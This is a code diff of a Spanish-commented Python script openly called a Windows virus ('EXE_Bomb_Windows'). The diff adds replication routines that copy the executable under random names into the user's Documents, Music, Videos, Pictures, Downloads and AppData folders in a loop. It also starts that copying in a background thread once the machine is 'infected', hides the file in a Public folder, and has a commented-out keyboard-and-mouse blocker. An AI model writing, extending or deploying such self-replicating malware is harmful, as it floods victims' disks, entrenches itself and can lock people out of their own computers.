@@ -58,8 +58,7 @@ def AutoCopy():
     nameKey     = "EXE_Bomb_Windows" # Nombre del virus
     user        = str(getuser())
     path        = "C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\"+nameKey+".exe"   # Segunda iniciada, esto debe existir
-    
-    
+    can  = 32    # Números de caracteres del nombre del virus
     documentos  = 'C:\\Users\\'+user+'\\Documents'
     music       = 'C:\\Users\\'+user+'\\Music'
     video       = 'C:\\Users\\'+user+'\\Videos'
@@ -70,7 +69,6 @@ def AutoCopy():
     local       = 'C:\\Users\\'+user+'\\AppData\\Local\\VirusBomb'
     
 
-    
     def CreateFolder():
         try:  # Intenta crear la dirección 
             os.makedirs(documentos)
@@ -104,25 +102,75 @@ def AutoCopy():
             os.makedirs(local)
         except:
             pass
-    def Copy():
-        shutil.copy(path, documentos+"\\"+random_char(32)+".exe")
-        print("se copio exitosamente al escritorio")
-    #inicia
-    CreateFolder()  
-    for x in range(20):    #720
-        print("virus replicado...")
-        Copy()
+    def CopyDoc():
+        try:
+            shutil.copy(path, documentos+"\\"+random_char(can)+".exe")
+        except:
+            pass
+    def CopyMus():
+        try:
+            shutil.copy(path, music+"\\"+random_char(can)+".exe")
+        except:
+            pass        
+    def CopyVic():
+        try:
+            shutil.copy(path, video+"\\"+random_char(can)+".exe")
+        except:
+            pass   
+    def CopyPic():
+        try:
+            shutil.copy(path, picture+"\\"+random_char(can)+".exe")
+        except:
+            pass        
+    def CopyDow():
+        try:
+            shutil.copy(path, download +"\\"+random_char(can)+".exe")
+        except:
+            pass         
+    def CopyRoa():
+        try:
+            shutil.copy(path, roaming+"\\"+random_char(can)+".exe")
+        except:
+            pass 
+    def CopyLocL():
+        try:
+            shutil.copy(path, locallow +"\\"+random_char(can)+".exe")
+        except:
+            pass 
+    def CopyLoc():
+        try:
+            shutil.copy(path, local+"\\"+random_char(can)+".exe")
+        except:
+            pass 
+    
+    #inicia Hilo
+    CreateFolder() 
+    for x in range(150):    #Cambiar por un while(True)
+        CopyDoc()
+        """
+        CopyMus()
+        CopyVic()
+        CopyPic()
+        CopyDow()
+        CopyRoa()
+        CopyLocL()
+        CopyLoc()
+        """
+
+
+        
+        
 if __name__ == '__main__':
     if (CreateFileMain()):  # Se ejecuta en el primer inicio
         nameKey = "EXE_Bomb_Windows.exe"
         filePath = "C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\"+ nameKey 
         try:     
-            with open(filePath, 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
+            with open(filePath, 'r') as f:      # Verifica el virus se encuentra oculto en el sistema
                 print("El virus existe")
         except : #Replica 
             print("No se encuentra en la carpeta, replicando...")
             try:
-                shutil.copy(nameKey , filePath) # Intenta ocultar el keylogger en una carpeta
+                shutil.copy(nameKey , filePath) # Intenta ocultar el virus en una carpeta
                 print("Se replicó exitosamente")
             except:
                 print("Replica fallida")
@@ -132,11 +180,11 @@ if __name__ == '__main__':
         exit()
     else:                   # Solo se ejecuta si la PC ya está infectada
         #block= threading.Thread(target=Block)   # Bloquea Teclado y mouse
-        #autocopy= threading.Thread(target=AutoCopy)   # Copia y replica el virus en muchas carpetas del usuario
+        autocopy= threading.Thread(target=AutoCopy)   # Copia y replica el virus en muchas carpetas del usuario
         
         #block.start()
-        #autocopy.start()         
-        AutoCopy()
+        autocopy.start()         
+        
         
         
         
@@ -157,4 +205,4 @@ if __name__ == '__main__':
         #p1.join()
         #p2.join()
         print("la carpeta ya existe, virus en acción")
-        pass
+
